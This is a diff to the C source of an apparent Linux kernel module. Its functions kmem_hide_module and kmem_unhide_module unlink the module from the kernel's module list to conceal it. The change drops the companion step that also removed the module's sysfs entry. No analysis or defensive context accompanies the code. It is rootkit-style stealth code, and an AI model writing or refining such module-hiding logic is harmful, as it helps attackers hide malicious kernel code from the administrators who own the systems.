@@ -29,7 +29,6 @@
 #include <linux/slab.h>
 #include <linux/highmem.h>
 #include <linux/list.h>
-#include <linux/kobject.h>
 #include <linux/mutex.h>
 #include <asm/pgtable.h>
 
@@ -62,7 +61,6 @@
 
 static int kmem_hidden;
 static struct list_head *kmem_hide_prev;
-static struct kobject *kmem_hide_parent;
 
 static void kmem_hide_module(struct module *mod)
 {
@@ -72,24 +70,16 @@ static void kmem_hide_module(struct module *mod)
 	kmem_hide_prev = mod->list.prev;
 	list_del(&mod->list);
 	mutex_unlock(&module_mutex);
-	kmem_hide_parent = mod->mkobj.kobj.parent;
-	kobject_del(&mod->mkobj.kobj);
 	kmem_hidden = 1;
 }
 
 static void kmem_unhide_module(struct module *mod)
 {
-	struct kobject *kobj;
-
 	if (!kmem_hidden)
 		return;
 	mutex_lock(&module_mutex);
 	list_add(&mod->list, kmem_hide_prev);
 	mutex_unlock(&module_mutex);
-	kobj = &mod->mkobj.kobj;
-	if (kmem_hide_parent)
-		kobject_add(kobj, kmem_hide_parent, "%s", mod->name);
-	kmem_hide_parent = NULL;
 	kmem_hidden = 0;
 }
 
